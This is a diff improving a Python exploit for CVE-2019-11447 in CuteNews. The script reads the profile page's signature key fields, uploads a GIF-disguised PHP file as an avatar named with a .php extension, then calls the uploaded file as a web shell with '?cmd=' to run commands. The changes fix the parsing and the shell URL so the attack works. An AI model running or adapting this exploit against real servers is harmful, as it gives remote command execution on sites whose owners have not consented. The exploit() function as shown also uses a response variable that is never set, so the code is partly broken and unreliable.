@@ -3,6 +3,7 @@ import requests
 import random
 import sys
 import re
+import lxml.html
 from log_colors import *
 import string
 requests.packages.urllib3.disable_warnings()
@@ -56,18 +57,25 @@ class CVE2019_11447:
     def get_signature_key(self):
         print (LogColors.BLUE + "get signature key..." + LogColors.ENDC)
         r = self.session.get(self.url.rstrip("/") + "/index.php?mod=main&opt=personal")
-        sk_sd = re.findall('.*name="__signature_key" value="(.*?)".*name="__signature_dsi" value="(.*?)".*', r.text)
-        signature_key, signature_dsi = sk_sd[0][0], sk_sd[0][1]
+        #sk_sd = re.findall('.*name="__signature_key" value="(.*?)".*name="__signature_dsi" value="(.*?)".*', r.text)
+        #signature_key, signature_dsi = sk_sd[0][0], sk_sd[0][1]
+        tree = lxml.html.fromstring(r.text)
+        signature_key = tree.xpath('.//input[contains(@name, "__signature_key")]/@value')
+        signature_dsi = tree.xpath('.//input[contains(@name, "__signature_dsi")]/@value')
+        signature_key = signature_key[0]
+        signature_dsi = signature_dsi[0]
+        print (signature_key, signature_dsi)
         data = {
             "mod" : (None, "main"),
             "opt" : (None, "personal"),
-            "__signature_key" : signature_key,
-            "__signature_dsi" : signature_dsi,
+            "__signature_key" : (None, signature_key),
+            "__signature_dsi" : (None, signature_dsi),
             "editpassword" : (None, None),
             "confirmpassword" : (None, None),
             "avatar_file" : (self.filename + ".php", open("hack.gif", "rb").read()),
         }
         self.payload_data = data
+        print (LogColors.YELLOW + "filename for payload: " + self.filename + LogColors.ENDC)
 
     def upload_payload(self):
         self.check_version()
@@ -80,20 +88,20 @@ class CVE2019_11447:
         else:
             print (LogColors.RED + "upload avatar failed :(" + LogColors.ENDC)
             sys.exit()
-
-        r = self.session.get(
-            self.url.rstrip("/") + "/uploads/avatar_{}_{}.php".format(self.user, self.filename)
-        )
+        
+        avatar_url = self.url.rstrip("/") + "/uploads/avatar_{}_{}.php".format(self.user, self.filename)
+        r = self.session.get(avatar_url)
 
         if r.ok:
             shell_url = self.url.rstrip("/") + "/uploads/avatar_{}_{}.php?cmd=<command>".format(self.user, self.filename)
             print (LogColors.YELLOW + "have reverse shell!" + LogColors.ENDC)
+            print (LogColors.YELLOW + shell_url + LogColors.ENDC)
             print (LogColors.GREEN + "successfully checked, hacked :)" + LogColors.ENDC)
         else:
             print (LogColors.RED + "upload avatar failed :(" + LogColors.ENDC)
 
     def exploit(self, cmd):
-        shell_url = self.url.rstrip("/") + "/uploads/avatar_{}_{}.php?cmd{}".format(self.user, self.filename, cmd)
+        shell_url = self.url.rstrip("/") + "/uploads/avatar_{}_{}.php?cmd={}".format(self.user, self.filename, cmd)
         print (LogColors.YELLOW + "request: " + shell_url + "..." + LogColors.ENDC)
         if r.ok:
             output = r.text[r.text.find(self.kstart) + len(self.kstart):r.text.find(self.kend)].strip()
